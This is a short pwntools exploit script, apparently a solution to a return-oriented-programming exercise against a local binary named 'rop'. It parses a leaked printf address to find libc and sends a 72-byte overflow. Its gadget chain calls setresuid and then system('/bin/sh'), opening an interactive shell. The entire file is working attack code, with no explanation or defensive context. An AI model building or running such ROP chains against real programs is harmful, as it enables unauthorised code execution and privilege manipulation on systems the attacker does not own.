from pwn import *

printf_offset = 0x54340
binsh_offset = 0x180543
system_offset = 0x46590
setresuid_offset = 0xc5f80

pop_rdi = 0x400853
pop_rdx_offset = 0x10bd59

p = process('./rop')

p.recvuntil(': ')
printf = int(p.recvuntil('\n'), 16)
libc = printf - printf_offset
pop_rdx = libc + pop_rdx_offset
setresuid = libc + setresuid_offset
system = libc + system_offset
binsh = libc + binsh_offset

payload = "A"*72

payload += p64(pop_rdi)
payload += p64(1000)
payload += p64(pop_rdx)
payload += p64(1000)
payload += p64(1000)
payload += p64(setresuid)

payload += p64(pop_rdi)
payload += p64(binsh)
payload += p64(system)

p.send(payload)
p.interactive()
